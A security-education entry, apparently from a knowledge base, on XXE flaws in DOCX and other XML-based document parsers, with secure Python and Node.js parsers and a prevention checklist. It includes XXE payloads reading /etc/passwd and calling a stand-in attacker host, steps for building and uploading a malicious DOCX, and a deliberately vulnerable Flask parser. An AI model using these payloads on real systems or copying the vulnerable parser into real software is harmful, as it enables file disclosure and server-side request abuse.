{
  "id": "document-parsers",
  "category": "contexts",
  "title": "XXE in Document Parsers",
  "description": "XXE vulnerabilities in document parsing libraries for DOCX, XLSX, PPTX, ODT, and other XML-based document formats.",
  "severity": "high",
  "cvssScore": 7.5,
  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
  "sections": [
    {
      "id": "overview",
      "title": "Overview",
      "type": "text",
      "content": "Modern document formats (DOCX, XLSX, PPTX, ODT, etc.) are actually ZIP archives containing XML files. Applications that parse these documents to extract content, metadata, or for conversion can be vulnerable to XXE attacks.\n\n**XML-Based Document Formats:**\n• **Microsoft Office:** DOCX, XLSX, PPTX (Office Open XML)\n• **LibreOffice:** ODT, ODS, ODP (OpenDocument Format)\n• **Others:** EPUB, Pages, Numbers, Keynote\n\n**Why Document Parsers are Vulnerable:**\n• Documents are ZIP archives with XML files inside\n• Parsers extract and parse XML to read content\n• Often trusted as \"documents\" not \"XML\"\n• Uploaded to web apps for processing/conversion\n• Parsed server-side for search indexing, preview generation\n\n**Common Scenarios:**\n• Resume/CV upload and parsing\n• Document to PDF conversion\n• Search indexing (extracting text)\n• Metadata extraction\n• Document preview generation\n• Template processing"
    },
    {
      "id": "docx-structure",
      "title": "DOCX File Structure",
      "type": "text",
      "content": "**DOCX is a ZIP archive containing:**\n\n```\ndocument.docx/\n├── [Content_Types].xml\n├── _rels/\n│   └── .rels\n├── word/\n│   ├── document.xml      ← Main document content (XXE target)\n│   ├── styles.xml\n│   ├── settings.xml\n│   ├── fontTable.xml\n│   ├── _rels/\n│   │   └── document.xml.rels\n│   └── media/\n│       └── image1.png\n└── docProps/\n    ├── core.xml          ← Metadata (XXE target)\n    └── app.xml\n```\n\n**Key XML Files:**\n• **word/document.xml** - Document body content\n• **docProps/core.xml** - Metadata (author, title, etc.)\n• **word/styles.xml** - Styling information\n• **[Content_Types].xml** - MIME types\n\n**Attack Vector:**\nInject XXE payload into any XML file within the ZIP archive. When application extracts and parses the document, XXE is triggered."
    },
    {
      "id": "docx-xxe-attack",
      "title": "XXE in DOCX Document",
      "type": "code",
      "code": {
        "language": "xml",
        "code": "<!-- Malicious word/document.xml inside DOCX -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE w:document [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<w:document \n    xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\n  <w:body>\n    <w:p>\n      <w:r>\n        <w:t>&xxe;</w:t>\n      </w:r>\n    </w:p>\n  </w:body>\n</w:document>\n\n<!-- Alternative: XXE in metadata (docProps/core.xml) -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<!DOCTYPE cp:coreProperties [\n  <!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">\n]>\n<cp:coreProperties \n    xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\">\n  <dc:creator>&xxe;</dc:creator>\n  <dc:title>Document Title</dc:title>\n  <dc:description>Description</dc:description>\n</cp:coreProperties>\n\n<!-- To create malicious DOCX:\n1. Create normal DOCX file\n2. Unzip it\n3. Edit word/document.xml or docProps/core.xml\n4. Add DOCTYPE with XXE payload\n5. Rezip the archive as .docx\n6. Upload to target application\n-->\n\n# Command to create malicious DOCX:\n# unzip document.docx -d document/\n# Edit document/word/document.xml (add XXE)\n# cd document && zip -r ../malicious.docx * && cd ..\n# Upload malicious.docx",
        "isVulnerable": true,
        "filename": "docx_xxe_payload.xml"
      }
    },
    {
      "id": "vulnerable-python",
      "title": "Vulnerable DOCX Parser (Python)",
      "type": "code",
      "code": {
        "language": "python",
        "code": "# VULNERABLE: Using python-docx without proper validation\nfrom docx import Document\nfrom flask import Flask, request\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/uploads'\n\n@app.route('/upload', methods=['POST'])\ndef upload_document():\n    file = request.files['file']\n    \n    # Check extension\n    if not file.filename.endswith('.docx'):\n        return 'Only DOCX files allowed', 400\n    \n    # Save file\n    filepath = os.path.join(UPLOAD_FOLDER, file.filename)\n    file.save(filepath)\n    \n    # VULNERABLE: Parse DOCX\n    # python-docx uses lxml which may be vulnerable if not configured\n    try:\n        doc = Document(filepath)\n        \n        # Extract text\n        full_text = []\n        for paragraph in doc.paragraphs:\n            full_text.append(paragraph.text)\n        \n        # Extract metadata\n        core_props = doc.core_properties\n        author = core_props.author\n        title = core_props.title\n        \n        # If XXE payload in document.xml or core.xml,\n        # entities may be expanded here!\n        \n        return f'Document processed: {title} by {author}', 200\n        \n    except Exception as e:\n        return f'Error: {str(e)}', 500\n\n# Problems:\n# 1. No validation of DOCX content before parsing\n# 2. python-docx uses lxml which needs secure configuration\n# 3. No sanitization of extracted content\n# 4. Errors may leak sensitive information",
        "isVulnerable": true,
        "filename": "vulnerable_docx.py"
      }
    },
    {
      "id": "secure-python",
      "title": "Secure DOCX Parser (Python)",
      "type": "code",
      "code": {
        "language": "python",
        "code": "from flask import Flask, request, jsonify\nfrom defusedxml import ElementTree\nimport zipfile\nimport os\nimport re\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/uploads'\nMAX_FILE_SIZE = 10485760  # 10MB\n\ndef validate_docx(filepath):\n    \"\"\"\n    Validate DOCX file for XXE and other attacks\n    \n    Args:\n        filepath: Path to DOCX file\n    \n    Returns:\n        True if valid, raises exception otherwise\n    \"\"\"\n    # Verify it's a valid ZIP file\n    if not zipfile.is_zipfile(filepath):\n        raise ValueError('Not a valid DOCX file (not a ZIP archive)')\n    \n    # Open ZIP archive\n    with zipfile.ZipFile(filepath, 'r') as zip_file:\n        # Check for suspicious files\n        for name in zip_file.namelist():\n            # Path traversal check\n            if '..' in name or name.startswith('/'):\n                raise ValueError('Path traversal detected in archive')\n        \n        # Validate key XML files\n        xml_files_to_check = [\n            'word/document.xml',\n            'docProps/core.xml',\n            '[Content_Types].xml'\n        ]\n        \n        for xml_file in xml_files_to_check:\n            if xml_file in zip_file.namelist():\n                # Extract and validate XML\n                xml_content = zip_file.read(xml_file)\n                validate_xml_content(xml_content, xml_file)\n    \n    return True\n\ndef validate_xml_content(xml_bytes, filename):\n    \"\"\"\n    Validate individual XML file from DOCX\n    \n    Args:\n        xml_bytes: XML content as bytes\n        filename: Name of XML file (for logging)\n    \"\"\"\n    # Check for DOCTYPE\n    if b'<!DOCTYPE' in xml_bytes:\n        raise ValueError(f'{filename}: DOCTYPE not allowed')\n    \n    # Check for ENTITY declarations\n    if b'<!ENTITY' in xml_bytes:\n        raise ValueError(f'{filename}: ENTITY declarations not allowed')\n    \n    # Check for suspicious patterns\n    dangerous_patterns = [\n        b'SYSTEM',\n        b'PUBLIC',\n        b'file://',\n        b'http://',\n        b'https://'\n    ]\n    \n    for pattern in dangerous_patterns:\n        if pattern in xml_bytes:\n            raise ValueError(f'{filename}: Suspicious pattern detected')\n    \n    # Parse with defusedxml (prevents XXE)\n    try:\n        ElementTree.fromstring(xml_bytes)\n    except ElementTree.ParseError as e:\n        raise ValueError(f'{filename}: Invalid XML - {e}')\n\ndef extract_docx_text_safe(filepath):\n    \"\"\"\n    Safely extract text from DOCX\n    \n    Args:\n        filepath: Path to validated DOCX file\n    \n    Returns:\n        Dictionary with extracted text and metadata\n    \"\"\"\n    result = {\n        'paragraphs': [],\n        'metadata': {}\n    }\n    \n    with zipfile.ZipFile(filepath, 'r') as zip_file:\n        # Extract document.xml safely\n        if 'word/document.xml' in zip_file.namelist():\n            doc_xml = zip_file.read('word/document.xml')\n            doc_tree = ElementTree.fromstring(doc_xml)\n            \n            # Extract text from paragraphs\n            # Note: This is simplified, real DOCX parsing is complex\n            namespace = {'w': 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'}\n            for para in doc_tree.findall('.//w:p', namespace):\n                text_elements = para.findall('.//w:t', namespace)\n                paragraph_text = ''.join([t.text or '' for t in text_elements])\n                if paragraph_text:\n                    result['paragraphs'].append(paragraph_text)\n        \n        # Extract metadata safely\n        if 'docProps/core.xml' in zip_file.namelist():\n            core_xml = zip_file.read('docProps/core.xml')\n            core_tree = ElementTree.fromstring(core_xml)\n            \n            # Extract metadata (safely, no entity expansion)\n            # Simplified extraction\n            result['metadata'] = {\n                'processed': True\n            }\n    \n    return result\n\n@app.route('/upload', methods=['POST'])\ndef upload_document():\n    \"\"\"\n    Secure DOCX upload and processing\n    \"\"\"\n    if 'file' not in request.files:\n        return jsonify({'error': 'No file provided'}), 400\n    \n    file = request.files['file']\n    \n    # Validate filename\n    if not file.filename.lower().endswith('.docx'):\n        return jsonify({'error': 'Only DOCX files allowed'}), 400\n    \n    # Save with safe filename\n    safe_filename = secure_filename(file.filename)\n    filepath = os.path.join(UPLOAD_FOLDER, safe_filename)\n    file.save(filepath)\n    \n    try:\n        # Validate DOCX for XXE and other attacks\n        validate_docx(filepath)\n        \n        # Extract content safely\n        content = extract_docx_text_safe(filepath)\n        \n        return jsonify({\n            'status': 'success',\n            'paragraphs_count': len(content['paragraphs']),\n            'metadata': content['metadata']\n        }), 200\n        \n    except ValueError as e:\n        # Clean up file\n        if os.path.exists(filepath):\n            os.unlink(filepath)\n        return jsonify({'error': str(e)}), 400\n    except Exception as e:\n        # Clean up file\n        if os.path.exists(filepath):\n            os.unlink(filepath)\n        app.logger.error(f'Processing error: {e}')\n        return jsonify({'error': 'Processing failed'}), 500\n\ndef secure_filename(filename):\n    \"\"\"Generate secure filename\"\"\"\n    filename = os.path.basename(filename)\n    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)\n    import time\n    timestamp = int(time.time())\n    name, ext = os.path.splitext(filename)\n    return f\"{name}_{timestamp}{ext}\"\n\nif __name__ == '__main__':\n    app.run(debug=False)",
        "isVulnerable": false,
        "filename": "secure_docx_parser.py"
      }
    },
    {
      "id": "nodejs-docx",
      "title": "Secure Node.js DOCX Processing",
      "type": "code",
      "code": {
        "language": "javascript",
        "code": "const express = require('express');\nconst multer = require('multer');\nconst JSZip = require('jszip');\nconst { XMLParser } = require('fast-xml-parser');\nconst fs = require('fs').promises;\n\nconst app = express();\nconst MAX_FILE_SIZE = 10485760; // 10MB\n\n// Configure multer\nconst upload = multer({\n    limits: { fileSize: MAX_FILE_SIZE },\n    fileFilter: (req, file, cb) => {\n        if (!file.originalname.endsWith('.docx')) {\n            return cb(new Error('Only DOCX files allowed'));\n        }\n        cb(null, true);\n    }\n});\n\n// Validate DOCX file\nasync function validateDOCX(buffer) {\n    const zip = await JSZip.loadAsync(buffer);\n    \n    // Files to validate\n    const xmlFiles = [\n        'word/document.xml',\n        'docProps/core.xml',\n        '[Content_Types].xml'\n    ];\n    \n    for (const filename of xmlFiles) {\n        const file = zip.file(filename);\n        if (file) {\n            const content = await file.async('string');\n            validateXMLContent(content, filename);\n        }\n    }\n    \n    return true;\n}\n\nfunction validateXMLContent(xml, filename) {\n    // Check for DOCTYPE\n    if (xml.includes('<!DOCTYPE')) {\n        throw new Error(`${filename}: DOCTYPE not allowed`);\n    }\n    \n    // Check for ENTITY\n    if (xml.includes('<!ENTITY')) {\n        throw new Error(`${filename}: ENTITY not allowed`);\n    }\n    \n    // Check for suspicious patterns\n    const dangerous = ['SYSTEM', 'PUBLIC', 'file://', 'http://'];\n    for (const pattern of dangerous) {\n        if (xml.includes(pattern)) {\n            throw new Error(`${filename}: Suspicious pattern detected`);\n        }\n    }\n    \n    // Parse with fast-xml-parser (safe, no external entities)\n    const parser = new XMLParser();\n    try {\n        parser.parse(xml);\n    } catch (e) {\n        throw new Error(`${filename}: Invalid XML`);\n    }\n}\n\nasync function extractDOCXText(buffer) {\n    const zip = await JSZip.loadAsync(buffer);\n    const documentXml = await zip.file('word/document.xml').async('string');\n    \n    // Parse safely\n    const parser = new XMLParser({\n        ignoreAttributes: false\n    });\n    const parsed = parser.parse(documentXml);\n    \n    // Extract text (simplified)\n    // Real DOCX parsing is more complex\n    return {\n        processed: true,\n        // Additional extraction logic here\n    };\n}\n\napp.post('/upload', upload.single('file'), async (req, res) => {\n    try {\n        if (!req.file) {\n            return res.status(400).json({ error: 'No file uploaded' });\n        }\n        \n        // Read file buffer\n        const buffer = await fs.readFile(req.file.path);\n        \n        // Validate DOCX\n        await validateDOCX(buffer);\n        \n        // Extract content safely\n        const content = await extractDOCXText(buffer);\n        \n        // Clean up uploaded file\n        await fs.unlink(req.file.path);\n        \n        res.json({\n            status: 'success',\n            content\n        });\n        \n    } catch (error) {\n        // Clean up\n        if (req.file) {\n            await fs.unlink(req.file.path).catch(() => {});\n        }\n        \n        res.status(400).json({ error: error.message });\n    }\n});\n\napp.listen(3000);",
        "isVulnerable": false,
        "filename": "secure_docx_node.js"
      }
    },
    {
      "id": "prevention-checklist",
      "title": "Document Parser Security Checklist",
      "type": "text",
      "content": "☐ **Upload Validation**\n   • Verify file extension (.docx, .xlsx, etc.)\n   • Check MIME type\n   • Enforce file size limits (10MB max)\n   • Verify ZIP structure is valid\n   • Check for path traversal in ZIP entries\n\n☐ **XML Validation**\n   • Extract XML files from ZIP\n   • Reject files with DOCTYPE declarations\n   • Reject files with ENTITY declarations\n   • Check for SYSTEM/PUBLIC keywords\n   • Validate each XML file with secure parser\n\n☐ **Parser Configuration**\n   • Use defusedxml (Python) or fast-xml-parser (Node.js)\n   • Disable external entity resolution\n   • Disable DTD processing\n   • Set entity expansion limits\n\n☐ **Library-Specific**\n   • **Python (python-docx):** Ensure lxml configured securely\n   • **Node.js (docxtemplater):** Use with fast-xml-parser\n   • **Java (Apache POI):** Configure secure DocumentBuilderFactory\n   • **.NET (OpenXML SDK):** Set DtdProcessing.Prohibit\n\n☐ **Processing**\n   • Process in isolated environment\n   • Don't execute macros\n   • Sanitize extracted content\n   • Limit resource usage (memory, CPU)\n   • Use timeouts for parsing operations\n\n☐ **Testing**\n   • Test with malicious DOCX containing XXE\n   • Test with malicious XLSX\n   • Test with billion laughs in document.xml\n   • Verify entities not expanded\n   • Test with automated scanners"
    }
  ],
  "relatedTopics": ["file-upload-xxe", "xml-basics", "python-prevention", "nodejs-prevention"],
  "references": [
    {
      "title": "Office Open XML Specification",
      "url": "https://www.ecma-international.org/publications-and-standards/standards/ecma-376/"
    },
    {
      "title": "OpenDocument Format",
      "url": "https://www.oasis-open.org/committees/tc_home.php?wg_abbrev=office"
    }
  ]
}
